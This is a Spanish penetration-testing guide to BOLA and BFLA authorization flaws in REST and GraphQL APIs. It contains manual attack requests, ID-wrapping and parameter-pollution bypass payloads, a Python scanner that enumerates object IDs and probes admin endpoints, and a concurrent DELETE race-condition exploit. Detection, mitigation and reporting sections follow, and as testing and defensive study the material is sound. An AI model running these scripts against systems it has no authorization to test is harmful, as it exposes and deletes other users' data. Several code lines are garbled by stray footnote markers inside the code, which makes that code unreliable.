# Referencias Inseguras por Niveles: BOLA y BFLA

## Resumen

BOLA (Broken Object Level Authorization) permite acceso no autorizado a objetos específicos mediante manipulación de identificadores, mientras BFLA (Broken Function Level Authorization) expone funciones administrativas a usuarios sin privilegios. La aplicación falla al verificar permisos por objeto o función, permitiendo escalada horizontal (acceso a datos de otros usuarios) y vertical (funciones administrativas). Aplica cuando endpoints de APIs carecen de validaciones adecuadas de autorización granular.[^4]

## Contexto

Las pruebas requieren navegador moderno, proxy como Burp Suite para manipulación de peticiones, múltiples cuentas con diferentes niveles de privilegio y acceso a APIs REST/GraphQL. Los entornos modernos incluyen microservicios con autorización distribuida, tokens JWT con claims malformados y GraphQL con resolvers sin validación. Las herramientas automatizadas como BOLABuster usan LLMs para detección inteligente de patrones vulnerables.[^7]

## Metodología

### Identificación de Objetos y Funciones Vulnerables

1. **Mapear endpoints con referencias de objetos**
   - URLs con IDs: `/api/user/123`, `/order/{orderId}`
   - Parámetros en cuerpo JSON con identificadores
   - GraphQL queries con argumentos de objeto[^7]
   - Funciones administrativas: `/admin/*`, `/management/*`
2. **Catalogar niveles de autorización**[^4]
   - Usuario anónimo vs autenticado
   - Roles básicos vs administrativos
   - Permisos inter-organizacionales (multi-tenant)
   - Funciones sensibles (create, update, delete)
3. **Análisis de control de acceso**[^8]
   - Verificar validación por objeto individual
   - Confirmar checks de función por rol
   - Evaluar bypass mediante manipulación de parámetros
   - Testear condiciones de carrera en validaciones[^9]

### Checklist de Verificación

- [ ]  Identificar endpoints con identificadores de objeto manipulables
- [ ]  Verificar funciones administrativas sin validación de rol
- [ ]  Testear bypass mediante wrapping de IDs en arrays/objetos[^10]
- [ ]  Probar parameter pollution (HTTP y JSON)[^10]
- [ ]  Evaluar race conditions en validaciones concurrentes[^9]
- [ ]  Confirmar GraphQL sin autorización por campo[^7]

## Pruebas Manuales

### Configuración Inicial

Usar Burp Suite con múltiples usuarios de diferentes roles. Interceptar tráfico y mapear endpoints que referencien objetos o funciones sensibles.

### Casos de Prueba BOLA

**Caso 1: Acceso horizontal a objetos de usuario**

```http
GET /api/user/profile/1001 HTTP/1.1
Host: victima.com
Authorization: Bearer token_usuario_A

# Cambiar ID de usuario A por usuario B
GET /api/user/profile/1002 HTTP/1.1
Host: victima.com
Authorization: Bearer token_usuario_A
```

**Caso 2: GraphQL con BOLA**[^6]

```graphql
# Query legítima
query {
  user(id: "current_user_id") {
    email
    transactions
  }
}

# Query con BOLA
query {
  user(id: "victim_user_id") {
    email
    transactions
  }
}
```

### Casos de Prueba BFLA

**Caso 1: Acceso a función administrativa**[^1]

```http
# Usuario normal accediendo a endpoint admin
GET /admin/view_users HTTP/1.1
Host: victima.com
Authorization: Bearer regular_user_token
```

**Caso 2: Escalada mediante cambio de método HTTP**[^11]

```http
# GET permitido para usuario normal
GET /api/users/1001 HTTP/1.1

# DELETE no validado - BFLA
DELETE /api/users/1001 HTTP/1.1
Authorization: Bearer regular_user_token
```

### Técnicas de Bypass Avanzadas[^10]

**Array wrapping:**

```json
{"user_id": [^8]} // En lugar de {"user_id": 123}
```

**Object wrapping:**

```json
{"user_id": {"id": 123}} // Bypass de validaciones simples
```

**Parameter pollution:**

```http
GET /api/profile?user_id=legit_id&user_id=victim_id
```

### Evidencias Mínimas

- Screenshots de respuestas con datos no autorizados
- Logs de peticiones mostrando bypass exitoso
- Comparación de datos accedidos vs autorizados por rol
- Confirmación de funciones ejecutadas sin privilegios

## PoC

### Manual: BOLA con Escalada de Datos

**Objetivo:** Demostrar acceso no autorizado a objetos de otros usuarios

**Pasos:**

1. Autenticarse como Usuario A (ID: 1001) en victima.com
2. Acceder a perfil propio: `GET /api/profile/1001`
3. Interceptar con Burp Suite y cambiar ID: `/api/profile/1002`
4. Observar acceso exitoso a datos de Usuario B
5. Intentar modificaciones: `PUT /api/profile/1002`

**Resultado Esperado:** Acceso completo a datos y modificación sin autorización

### Manual: BFLA con Funciones Administrativas

**Objetivo:** Ejecutar funciones administrativas con usuario normal

**Pasos:**

1. Autenticarse como usuario normal en victima.com
2. Descubrir endpoint administrativo: `/admin/delete_user`
3. Enviar petición con token de usuario normal
4. Confirmar ejecución exitosa de función privilegiada

### Automatizada: Script de Detección Integral

```python
import requests
import json
import asyncio
import aiohttp
from itertools import product
import concurrent.futures

class BOLABFLADetector:
    """
    Detector automatizado de vulnerabilidades BOLA y BFLA
    """
  
    def __init__(self, base_url, auth_tokens):
        self.base_url = base_url
        self.auth_tokens = auth_tokens  # Dict: {"admin": "token1", "user": "token2"}
        self.vulnerable_endpoints = []
  
    def test_bola_patterns(self, endpoint_template, id_range=(1, 100)):
        """
        Detecta BOLA mediante enumeración de IDs
        """
        vulnerable = []
  
        for user_role, token in self.auth_tokens.items():
            headers = {'Authorization': f'Bearer {token}'}
      
            for obj_id in range(id_range, id_range[^50] + 1):
                endpoint = endpoint_template.format(id=obj_id)
          
                try:
                    response = requests.get(
                        f"{self.base_url}{endpoint}", 
                        headers=headers, 
                        timeout=5
                    )
              
                    # Detectar acceso exitoso a objetos no autorizados
                    if response.status_code == 200:
                        data = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
                  
                        # Heurística: detectar datos de otros usuarios
                        if self._is_unauthorized_data(data, user_role, obj_id):
                            vulnerable.append({
                                'endpoint': endpoint,
                                'user_role': user_role,
                                'object_id': obj_id,
                                'vulnerability': 'BOLA',
                                'data_preview': str(data)[:200]
                            })
                            print(f"[+] BOLA encontrada: {user_role} accede a objeto {obj_id}")
                      
                except requests.RequestException as e:
                    continue
              
        return vulnerable
  
    def test_bfla_functions(self, admin_endpoints):
        """
        Detecta BFLA probando funciones administrativas con usuarios normales
        """
        vulnerable = []
        normal_user_token = self.auth_tokens.get('user', '')
  
        if not normal_user_token:
            print("[-] No hay token de usuario normal para probar BFLA")
            return vulnerable
      
        headers = {'Authorization': f'Bearer {normal_user_token}'}
  
        for endpoint_info in admin_endpoints:
            endpoint = endpoint_info['path']
            methods = endpoint_info.get('methods', ['GET'])
      
            for method in methods:
                try:
                    response = requests.request(
                        method, 
                        f"{self.base_url}{endpoint}",
                        headers=headers,
                        json={} if method in ['POST', 'PUT'] else None,
                        timeout=5
                    )
              
                    # Función administrativa ejecutada por usuario normal
                    if response.status_code in [200, 201, 202]:
                        vulnerable.append({
                            'endpoint': endpoint,
                            'method': method,
                            'user_role': 'user',
                            'vulnerability': 'BFLA',
                            'status_code': response.status_code,
                            'response_preview': response.text[:200]
                        })
                        print(f"[+] BFLA encontrada: usuario normal ejecutó {method} {endpoint}")
                  
                except requests.RequestException:
                    continue
              
        return vulnerable
  
    async def test_race_conditions(self, endpoint, concurrent_requests=10):
        """
        Detecta condiciones de carrera en validaciones de autorización
        """
        vulnerable = []
  
        async def make_concurrent_request(session, user_token, request_id):
            headers = {'Authorization': f'Bearer {user_token}'}
            async with session.get(f"{self.base_url}{endpoint}", headers=headers) as response:
                return {
                    'request_id': request_id,
                    'status_code': response.status,
                    'response_time': response.headers.get('X-Response-Time', 'N/A')
                }
  
        # Probar con usuario normal
        user_token = self.auth_tokens.get('user', '')
        if not user_token:
            return vulnerable
      
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(concurrent_requests):
                task = make_concurrent_request(session, user_token, i)
                tasks.append(task)
      
            results = await asyncio.gather(*tasks, return_exceptions=True)
      
            # Analizar resultados para detectar bypasses por race condition
            successful_requests = [r for r in results if isinstance(r, dict) and r['status_code'] == 200]
      
            if successful_requests and len(successful_requests) > concurrent_requests * 0.1:
                vulnerable.append({
                    'endpoint': endpoint,
                    'vulnerability': 'Race Condition Authorization Bypass',
                    'successful_requests': len(successful_requests),
                    'total_requests': concurrent_requests
                })
                print(f"[+] Race condition detectada en {endpoint}: {len(successful_requests)} éxitos de {concurrent_requests}")
  
        return vulnerable
  
    def test_graphql_bola(self, graphql_endpoint="/graphql"):
        """
        Detecta BOLA específico en GraphQL
        """
        vulnerable = []
  
        # Queries de prueba con diferentes IDs de usuario
        test_queries = [
            'query { user(id: "1") { email, profile } }',
            'query { user(id: "admin") { email, profile } }',
            'query { transaction(id: 1) { amount, user_id } }',
            'query { organization(id: 1) { name, users { email } } }'
        ]
  
        user_token = self.auth_tokens.get('user', '')
        headers = {
            'Authorization': f'Bearer {user_token}',
            'Content-Type': 'application/json'
        }
  
        for query in test_queries:
            try:
                response = requests.post(
                    f"{self.base_url}{graphql_endpoint}",
                    headers=headers,
                    json={'query': query},
                    timeout=5
                )
          
                if response.status_code == 200:
                    data = response.json()
                    # Si no hay errores de autorización, podría ser BOLA
                    if 'errors' not in data and 'data' in data:
                        vulnerable.append({
                            'endpoint': graphql_endpoint,
                            'query': query,
                            'vulnerability': 'GraphQL BOLA',
                            'response_data': str(data)[:200]
                        })
                        print(f"[+] GraphQL BOLA detectada con query: {query}")
                  
            except requests.RequestException:
                continue
          
        return vulnerable
  
    def _is_unauthorized_data(self, data, user_role, obj_id):
        """
        Heurística para determinar si los datos son no autorizados
        """
        if isinstance(data, dict):
            # Buscar indicadores de otros usuarios
            return (
                data.get('id') != obj_id or
                'admin' in str(data).lower() and user_role != 'admin' or
                'private' in str(data).lower()
            )
        return False
  
    def comprehensive_scan(self):
        """
        Escaneo completo de BOLA y BFLA
        """
        print("[*] Iniciando escaneo comprehensivo BOLA/BFLA...")
  
        all_vulnerabilities = []
  
        # Test BOLA en endpoints comunes
        bola_templates = [
            '/api/user/{id}',
            '/api/profile/{id}', 
            '/api/order/{id}',
            '/api/message/{id}',
            '/api/transaction/{id}'
        ]
  
        for template in bola_templates:
            vulns = self.test_bola_patterns(template)
            all_vulnerabilities.extend(vulns)
  
        # Test BFLA en funciones administrativas
        admin_endpoints = [
            {'path': '/admin/users', 'methods': ['GET', 'DELETE']},
            {'path': '/admin/settings', 'methods': ['GET', 'POST']},
            {'path': '/api/admin/reports', 'methods': ['GET']},
            {'path': '/management/audit', 'methods': ['GET']}
        ]
  
        bfla_vulns = self.test_bfla_functions(admin_endpoints)
        all_vulnerabilities.extend(bfla_vulns)
  
        # Test GraphQL BOLA
        graphql_vulns = self.test_graphql_bola()
        all_vulnerabilities.extend(graphql_vulns)
  
        # Test race conditions
        sensitive_endpoints = ['/api/balance/transfer', '/api/user/upgrade']
        for endpoint in sensitive_endpoints:
            race_vulns = asyncio.run(self.test_race_conditions(endpoint))
            all_vulnerabilities.extend(race_vulns)
  
        print(f"[*] Escaneo completado. Encontradas {len(all_vulnerabilities)} vulnerabilidades")
        return all_vulnerabilities

# Uso del detector
if __name__ == "__main__":
    # Configurar tokens de diferentes roles
    tokens = {
        "admin": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",  # Token admin real
        "user": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",   # Token usuario normal
    }
  
    detector = BOLABFLADetector("https://victima.com", tokens)
    vulnerabilities = detector.comprehensive_scan()
  
    # Generar reporte
    with open('bola_bfla_report.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=2)
```

## Explotación/Automatización

### Técnicas de Bypass Avanzadas

**Manipulación de Tipo de Datos**[^10]

```python
# Bypass mediante type juggling
payloads = [
    {"user_id": "123"},      # String
    {"user_id": 123},        # Integer  
    {"user_id": [^8]},      # Array
    {"user_id": {"id": 123}} # Objeto anidado
]
```

**Condiciones de Carrera**[^9]

```python
import asyncio
import aiohttp

async def race_condition_exploit():
    # Enviar requests concurrentes para bypass de validación
    tasks = []
    async with aiohttp.ClientSession() as session:
        for i in range(20):
            task = session.delete('/api/user/victim_id', 
                                headers={'Authorization': 'Bearer user_token'})
            tasks.append(task)
  
        results = await asyncio.gather(*tasks)
        successful = [r for r in results if r.status == 200]
        print(f"Bypass exitoso en {len(successful)} requests")
```

**GraphQL específico**[^6]

```graphql
# Bypass mediante aliases
query {
  user1: user(id: "current_user") { email }
  user2: user(id: "victim_user") { email }
}

# Bypass con fragmentos
fragment UserData on User {
  id
  email
  private_data
}
query {
  user(id: "victim_id") { ...UserData }
}
```

### Herramientas Automatizadas[^5]

**BOLABuster con IA:**

- Análisis de lógica de negocio con LLMs
- Generación inteligente de casos de prueba
- Detección de dependencias entre endpoints

**Integración CI/CD:**[^13]

```yaml
# GitHub Actions para detección BOLA/BFLA
- name: BOLA/BFLA Security Scan
  uses: secure-pipeline/bola-detector@v1
  with:
    api_spec: './openapi.yaml'
    auth_tokens: ${{ secrets.TEST_TOKENS }}
    endpoints_file: './endpoints.json'
```

## Impacto

### Escenario Real

Un atacante explota BOLA en API bancaria para acceder a transacciones de 50,000 clientes, obteniendo números de cuenta y patrones financieros. Posteriormente usa BFLA para ejecutar transferencias no autorizadas mediante funciones administrativas expuestas.[^14]

### Mapeo de Seguridad

- **OWASP:** API1:2023 - Broken Object Level Authorization, API5:2023 - Broken Function Level Authorization
- **CWE:** CWE-639 - Insecure Direct Object Reference, CWE-285 - Improper Authorization
- **CVSS v3.1:** Rango típico 7.0-9.0 (Alto-Crítico)[^15]

### Severidad CVSS

Para BOLA con datos sensibles:

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
Puntuación Base: 7.1
```

Para BFLA con funciones administrativas:

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Puntuación Base: 8.8  
```

## Detección

### Logs de Aplicación

Implementar logging de:

- Accesos a objetos con ID diferente al del usuario autenticado
- Ejecución de funciones por usuarios sin privilegios adecuados
- Patrones de enumeración secuencial de objetos
- Requests concurrentes con bypass de autorización[^9]

### Monitoreo Comportamental[^14]

Configurar alertas para:

- Acceso anómalo a objetos fuera del contexto del usuario
- Spike en requests a endpoints administrativos por usuarios normales
- Patrones de race conditions en validaciones críticas
- GraphQL queries con argumentos de objeto sospechosos[^7]

### Herramientas de Runtime[^16]

Implementar:

- Análisis de tráfico API en tiempo real
- Detección de anomalías en patrones de acceso
- Validación dinámica de autorización por objeto/función
- Correlación de eventos entre microservicios

## Mitigación

### Fix Principal para BOLA

Implementar validación de ownership por objeto:

```python
def get_user_profile(user_id, requesting_user_id):
    """
    Validación segura contra BOLA
    """
    # Verificar ownership del objeto
    profile = database.get_profile(user_id)
  
    if not profile:
        raise NotFoundError("Perfil no encontrado")
  
    # Verificar autorización específica por objeto
    if profile.owner_id != requesting_user_id:
        # Solo admin puede ver otros perfiles
        if not is_admin(requesting_user_id):
            raise UnauthorizedError("Acceso no autorizado")
  
    return profile
```

### Fix Principal para BFLA[^1]

Implementar checks de función por rol:

```python
def admin_delete_user(target_user_id, requesting_user_id):
    """
    Validación segura contra BFLA
    """
    # Verificar rol antes de ejecutar función
    if not has_role(requesting_user_id, 'admin'):
        raise ForbiddenError("Función requiere rol administrativo")
  
    # Validación adicional de negocio
    if not can_delete_user(target_user_id, requesting_user_id):
        raise BusinessLogicError("No permitido por reglas de negocio")
  
    return delete_user(target_user_id)
```

### Controles Adicionales

1. **Autorización granular**[^3]
   - Implementar RBAC/ABAC por objeto individual
   - Usar scopes OAuth específicos por función
   - Validar contexto de negocio en cada operación
2. **GraphQL específico**[^7]
   - Implementar authorization por field resolver
   - Usar depth limiting y query complexity analysis
   - Validar argumentos de objeto en cada query
3. **Prevención de Race Conditions**[^9]
   - Usar locks distributed para operaciones críticas
   - Implementar validación atómica de estado
   - Configurar timeouts apropiados para locks

### Pruebas Post-Fix

- Verificar que usuarios solo acceden a sus objetos autorizados
- Confirmar que funciones administrativas requieren roles apropiados
- Testear que race conditions no bypasan validaciones
- Validar que GraphQL respeta autorización por campo

## Errores Comunes

### Falsos Positivos

- Confundir objetos públicos con vulnerabilidades BOLA
- Reportar funciones de información pública como BFLA
- Asumir vulnerabilidad sin confirmar bypass real de autorización
- No considerar validaciones de negocio complejas[^14]

### Límites de Testing

- APIs con autorización multi-nivel compleja (ABAC avanzado)
- Sistemas con validación distribuida entre microservicios
- GraphQL con resolvers que implementan autorización dinámica[^7]
- Race conditions que requieren timing muy específico[^9]

## Reporte

### Título

"Autorización Insegura por Niveles - BOLA/BFLA con Acceso No Autorizado a Objetos y Funciones"

### Resumen Ejecutivo

La aplicación presenta fallas críticas de autorización que permiten acceso no autorizado a objetos de datos específicos (BOLA) y ejecución de funciones privilegiadas (BFLA), comprometiendo confidencialidad, integridad y disponibilidad del sistema.

### Pasos de Reproducción

**BOLA:**

1. Autenticarse como Usuario A (ID: 1001)
2. Acceder a perfil propio: `GET /api/profile/1001`
3. Modificar ID para Usuario B: `GET /api/profile/1002`
4. Observar acceso exitoso a datos no autorizados

**BFLA:**

1. Autenticarse como usuario normal
2. Enviar petición a función administrativa: `DELETE /admin/users/123`
3. Confirmar ejecución sin validación de rol
4. Observar función privilegiada ejecutada exitosamente

### Evidencias

- Screenshots de respuestas con datos no autorizados
- Logs de peticiones mostrando bypass de autorización
- Comparativa de datos accedidos vs datos autorizados por rol
- Scripts de automatización confirmando vulnerabilidades sistemáticas

### Mitigación Recomendada

Implementar validación obligatoria de autorización tanto a nivel de objeto (verificar ownership) como de función (verificar roles apropiados) antes de cada operación. Usar principio de menor privilegio y validación granular por recurso específico.


[^1]: https://www.cobalt.io/blog/a-deep-dive-into-broken-functionality-level-authorization-vulnerability-bfla
    
[^2]: https://vercara.digicert.com/resources/broken-function-level-authorization
    
[^3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization
    
[^4]: https://www.akamai.com/glossary/what-is-broken-function-level-authorization
    
[^5]: https://unit42.paloaltonetworks.com/automated-bola-detection-and-ai/
    
[^6]: https://salt.security/blog/api-threat-research-graphql-authorization-flaws-in-financial-technology-platform
    
[^7]: https://www.stackhawk.com/blog/applying-the-owasp-api-security-top-10-to-graphql-apis/
    
[^8]: https://community.atlassian.com/forums/App-Central-articles/API-Testing-Guide-Types-Tools-and-Best-Practices-for-2025/ba-p/2917700
    
[^9]: https://blog.securelayer7.net/synchronized-code-fix-api-race-conditions/
    
[^10]: https://www.traceable.ai/blog-post/a-deep-dive-on-the-most-critical-api-vulnerability----bola-broken-object-level-authorization
    
[^11]: https://graylog.org/post/understanding-broken-function-level-authorization/
    
[^12]: https://dev.to/zuplo/troubleshooting-broken-object-level-authorization-44f1
    
[^13]: https://securemyorg.com/automating-bola-detection-in-ci-cd-pipelines/
    
[^14]: https://lab.wallarm.com/unsolved-challenge-api-access-control-vulnerabilities/
    
[^15]: https://infosecwriteups.com/api-security-in-2025-the-most-overlooked-vulnerabilities-88f513ea347c
    
[^16]: https://www.raidiam.com/api-security-the-definitive-guide-for-2025-and-beyond
    
[^17]: https://corewin.ua/en/blog-en/broken-function-level-authorization-bfla-vulnerability/
    
[^18]: https://cybelangel.com/the-api-threat-report-2025/
    
[^19]: https://www.stackhawk.com/blog/understanding-and-protecting-against-api1-broken-object-level-authorization/
    
[^20]: https://salt.security/blog/api5-2023-broken-function-level-authorization
    
[^21]: https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
    
[^22]: https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/
    
[^23]: https://corewin.ua/en/blog-en/broken-object-level-authorization/
    
[^24]: https://salt.security/blog/api1-2023-broken-object-level-authentication
    
[^25]: https://www.pynt.io/learning-hub/owasp-top-10-guide/broken-function-level-authorization-how-it-works-and-4-preventive-measures
    
[^26]: https://42crunch.com/how-to-protect-apis-from-owasp-authorization-risks-bola-bopla-bfla/
    
[^27]: https://www.pynt.io/learning-hub/owasp-top-10-guide/broken-object-level-authorization-bola-impact-example-and-prevention
    
[^28]: https://learn.snyk.io/lesson/broken-function-level-authorization/
    
[^29]: https://www.imperva.com/learn/application-security/broken-object-level-authorization-bola/
    
[^30]: https://www.pynt.io/learning-hub/api-security-testing-guides/api-security-testing-tools
    
[^31]: https://www.stackhawk.com/blog/top-10-api-tools-for-testing-in-2025/
    
[^32]: https://infosecwriteups.com/the-ultimate-api-penetration-testing-checklist-2025-edition-092ca8a4056a
    
[^33]: https://qyrus.com/qapi/master-functional-api-testing-essential-techniques/
    
[^34]: https://www.testdevlab.com/blog/api-testing-with-cypress-2025
    
[^35]: https://testfully.io/blog/api-testing/
    
[^36]: https://www.indusface.com/blog/broken-function-level-authorization/
    
[^37]: https://dev.to/kevinwalker/top-api-testing-tools-for-2025-4dab
    
[^38]: https://www.jit.io/resources/appsec-tools/top-10-api-security-tools
    
[^39]: https://developers.cloudflare.com/api-shield/security/bola-vulnerability-detection/
    
[^40]: https://www.apisecuniversity.com/blog/how-i-automated-bola-detection-and-hardened-my-api----a-devsecops-tutorial
    
[^41]: https://unit42.paloaltonetworks.com/bola-vulnerabilities-easyappointments/
    
[^42]: https://www.thegreenreport.blog/articles/using-stress-tests-to-catch-race-conditions-in-api-rate-limiting-logic/using-stress-tests-to-catch-race-conditions-in-api-rate-limiting-logic.html
    
[^43]: https://www.radware.com/blog/application-protection/understanding-bola/
    
[^44]: https://www.invicti.com/web-application-vulnerabilities/horizontal-broken-function-level-authorization-bfla
    
[^45]: https://www.nango.dev/blog/why-is-oauth-still-hard
    
[^46]: https://www.invicti.com/web-application-vulnerabilities/vertical-broken-function-level-authorization-bfla
    
[^47]: https://www.stendahls.se/news-articles/how-to-avoid-race-conditions-and-authentication-chaos
    
[^48]: https://beaglesecurity.com/blog/article/graphql-attacks-vulnerabilities.html
    
[^49]: https://momentic.ai/resources/the-ultimate-guide-to-race-condition-testing-in-web-applications
    
[^50]: https://portswigger.net/web-security/access-control/idor
